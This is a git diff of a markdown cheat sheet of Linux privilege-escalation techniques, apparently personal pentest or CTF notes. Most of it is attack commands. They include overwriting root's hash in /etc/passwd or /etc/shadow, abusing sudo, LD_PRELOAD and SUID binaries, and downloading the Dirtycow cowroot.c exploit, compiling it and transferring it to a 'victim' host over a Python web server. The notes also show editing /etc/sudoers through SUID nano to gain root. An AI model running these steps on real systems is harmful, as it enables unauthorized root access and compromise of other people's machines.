@@ -1,4 +1,12 @@
-### File Permissions
+### Userful tools
+```bash
+## Linpeas
+./linpeas.sh
+## GTFOBins
+## Theres also a python version of GTFOBins
+```
+
+## File Permissions
 ```bash
 ## r=Readable w=Writable x=Executable -=Denied
 ## Example:
@@ -7,6 +15,7 @@ $ ls -l file
 ## Owner of file (rw-), Group (r--) Other(r--)
 ## Owner = read/write denied, group = read denied denied, other = read denied denied
 ```
+
 #### /etc/passwd/
 ```bash
 ls -la /etc/passwd
@@ -17,6 +26,7 @@ openssl passwd P@55word
 ## the characters that generated from above cmd should be add to the /etc/passwd file. replace the 'x' on the root user to try log in as root.
 su root
 ```
+
 ### /etc/shadow
 ```bash
 ## Same deal as the /etc/passwd file. Not good security if we have rw to this file. Example:
@@ -27,14 +37,15 @@ ls -la /etc/shadow
 mkpasswd -m sha-12 p@S5w0rd
 ## copy output and replace the root encryption found in /etc/shadow
 sudo su
-
 ```
+
 ### sudo -l
 ```bash
 ## run sudo -l to see if you have access to run any binaires as sudo.
 sudo -l 
 ## if anything returns in the output, go to GTFObin to find a way to exploit.
 ```
+
 ### env_keep+=LD_PRELOAD
 ```bash
 ## If you see env_keep+=LD_PRELOAD when you execite sudo -l you could priv esc to root this way. create a the following C file:
@@ -214,6 +225,72 @@ sudo chown +s bash
 ls -la bash
 ## bash binary should be owned by root ands have suid permissions.
 ./bash -p
+id
+cd /root
+```
+
+### Kernal Exploits
+```bash
+## Quick way to determine what kernal version you're on to google for exploit
+uname -a
+ ## Example of output:
+ 3.13.0-24-generic 46-Ubuntu SMP Thu Apr 10 19:11:08...
+ ## 3.13.0-24-generic is more than enough info to google
+
+## You can also use the tool linux-exploit-suggestor to find exploits
+## https://github.com/The-Z-Labs/linux-exploit-suggester
+
+## Transfer lin-exploit-sugg over to victim machine, host:
+sudo python3 -m http.server
+
+## On victims machine
+wget http://0.0.0.0:8000/linux-exploit-suggestor.sh
+chmod +x linux-exploit-suggestor.sh
+./linux-exploit-suggestor
+## Check results. Exmaple, you find Dirtycow. cowroot.c
+## Download and compile exploit on attacker host
+wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
+
+sudo gcc cowroot.c -o cowroot -pthread
+## Ignore warnings, start python server again and transfer cowroot exploit to victim host:
+chmod +x cowroot
+./cowroot
+id
+cd /root
+```
+
+### SUID/SGID
+```bash
+## Set User ID is a type of permission
+## Allow users to execute a file with permissions of a specified user.
+
+## This cmd can search for SUID files:
+find / -perm -u=s -type f 2>/dev/null
+
+## You can use GTFObins to exploit SUID permissions.
+## Now you need to check the permissions on the binaries returned. Example, /bin/nano returns in output.
+ls -la /bin/nano 
+## Output:
+-rwsr-sr-x 1 root root 245872 Mar 6 2018 /bin/nano
+
+## Cool. We have access to file and Root owns. Lets get access to /etc/sudoers
+ls -la /etc/sudoers
+-r--r----- 1 root root 754 Oct 6 07:57 /etc/sudoers
+## We do not have write access to sudoers file. Lets try access sudoers using root permissions in nano.
+/bin/nano /etc/sudoers
+
+## We can now view/edit the file.
+Under the root entry add your account.
+
+# User privilege specification
+root ALL=(ALL:ALL) ALL
+<YOUR-USERNAME> ALL=(ALL:ALL) ALL
+
+## Save the file and check your permissions
+sudo -l
+## enter pw
+
+sudo su
 id
 cd /root
 ```
